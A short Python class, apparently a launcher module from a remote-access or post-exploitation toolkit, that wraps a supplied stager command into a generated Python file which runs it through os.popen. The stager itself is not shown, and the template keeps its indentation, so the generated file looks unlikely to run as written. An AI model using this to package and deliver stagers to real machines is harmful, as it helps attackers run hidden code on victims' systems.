class Launcher:
    def __init__(self):
        self.info = {
            "Author": ["Marten4n6"],
            "Description": "Creates a python file launcher.",
            "References": [],
        }

    def generate(self, stager):
        return ("py", """\
        #!/usr/bin/env python
        # -*- coding: utf-8 -*-
        import os

        os.popen("%s")
        """ % stager.replace('"', '\\"'))
